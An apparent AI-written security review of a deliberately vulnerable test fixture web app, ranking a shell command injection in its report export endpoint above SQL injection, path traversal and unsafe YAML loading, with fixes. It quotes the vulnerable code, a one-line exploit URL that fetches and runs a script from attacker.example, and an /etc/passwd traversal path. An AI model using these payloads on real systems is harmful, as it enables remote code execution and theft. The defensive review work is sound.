# Scariest security hole — vuln-app

## TL;DR

**Unauthenticated-by-role remote command execution (RCE) via `GET /reports/export`.**
Any logged-in user — not just admins — can run arbitrary shell commands on the app server. This is the one that pages you: full host compromise, not just a data leak.

## Location

- `/home/bguest/personal-skills/skills/_fixtures/vuln-app/app/views.py:38-46` (`export_report`)
- Routed at `/home/bguest/personal-skills/skills/_fixtures/vuln-app/app/urls.py:9` -> `reports/export`

```python
@login_required
def export_report(request):
    """Kick off a report export. Users pick an output filename."""
    name = request.GET.get("name", "report")
    fmt = request.GET.get("format", "csv")
    # Hand the export off to the report generator CLI.
    cmd = "python -m app.tools.gen_report --name %s --format %s" % (name, fmt)
    subprocess.Popen(cmd, shell=True)
    return HttpResponse("export started")
```

## Why this is the one

- `name` and `format` come straight from the query string and are `%`-formatted into a string executed with `shell=True`. No escaping, allow-listing, or `shlex.quote`.
- The only gate is `@login_required` (see `app/auth.py`) — it checks that *some* session exists, with no role or permission check. Any authenticated user account is enough.
- Exploit is a one-liner:
  `GET /reports/export?name=x;curl+attacker.example/pwn.sh|sh;&format=csv`
  or with `$()`/backticks/`&&` — classic shell metacharacter injection, no special tooling needed.
- Impact is total: arbitrary code execution as the app's service user. From there an attacker pivots to:
  - The Postgres credentials in `app/config.py:13` (`DB_PASSWORD` hardcoded fallback `s3cr3t-pg-password-do-not-share`)
  - The Django `SECRET_KEY` in `app/config.py:16` (used for session/password-reset token signing — leaking it lets an attacker forge sessions or reset tokens for *any* user)
  - Any other secrets/network access reachable from the app host.
- This dominates the other issues present in the same app because it's the only one that yields code execution rather than data read/leak:
  - SQL injection in `search_products` (`views.py:16-22`, unauthenticated, string-concatenated `LIKE` clause) — serious, but "only" gives DB read (and possibly write, depending on DB privileges) via classic/blind SQLi.
  - Path traversal in `download_avatar` (`views.py:50-55`, `filename` passed straight into `os.path.join` and opened) — arbitrary file *read* (e.g. `../../../../etc/passwd`), not execution.
  - `yaml.load(raw_yaml)` without `Loader=SafeLoader` in `reports.py:10` — if `raw_yaml` is ever attacker-controlled this is itself an RCE primitive (PyYAML's default loader can construct arbitrary Python objects), but nothing in this codebase currently wires external input into `load_report_spec`. Worth fixing, but not the live, reachable hole today.
  - Hardcoded DB password and Django `SECRET_KEY` in `config.py` — bad practice, should rotate/move to a secrets manager, but only exploitable if leaked another way (e.g. via the RCE above).

## Fix

1. Never build shell strings from user input. Replace with `subprocess.run([...], shell=False)` and pass an argument list:
   ```python
   subprocess.Popen(["python", "-m", "app.tools.gen_report", "--name", name, "--format", fmt])
   ```
2. Even with `shell=False`, validate `name` (path-safe charset, no `/`, no `..`) and `format` (allow-list: `csv`, `pdf`, etc.) before use — `gen_report` likely uses them to build an output path.
3. Add an authorization check beyond "is logged in" if report export should be restricted (e.g. an admin/analyst-style role per this org's permission model) — `login_required` is an authentication check, not an authorization decision.
4. While in there: fix `download_avatar` (path traversal — normalize/validate `filename` against a fixed directory, reject `..`/absolute paths), parameterize `search_products`'s `LIKE` clause, and switch `yaml.load` to `yaml.safe_load`.
5. Rotate `DB_PASSWORD` and `SECRET_KEY` and move both to environment/secret-manager only — drop the hardcoded fallback values from source.

## Scope note

This review covered the 8 Python files under `/home/bguest/personal-skills/skills/_fixtures/vuln-app/app/` (`config.py`, `db.py`, `views.py`, `auth.py`, `services.py`, `reports.py`, `urls.py`, `__init__.py`). No files were modified — read-only review.
